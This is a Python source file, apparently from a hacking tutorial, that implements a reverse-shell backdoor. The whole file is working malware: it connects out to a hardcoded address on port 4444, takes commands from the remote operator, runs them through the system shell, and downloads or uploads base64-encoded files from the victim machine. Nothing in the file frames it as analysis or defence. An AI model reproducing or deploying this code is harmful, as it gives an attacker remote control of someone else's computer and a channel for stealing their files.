import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def safe_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_path(self, path):
        os.chdir(path)
        return "[+] Changing path to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] upload was successful"        

    def run_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.safe_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_path(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])    
                else:
                    command_result = self.run_system_commands(command)

            except Exception:
                command_result = "[+] There is an error in the code "    
                
            self.safe_send(command_result)

my_backdoor = Backdoor("192.168.80.130", 4444)
my_backdoor.run()


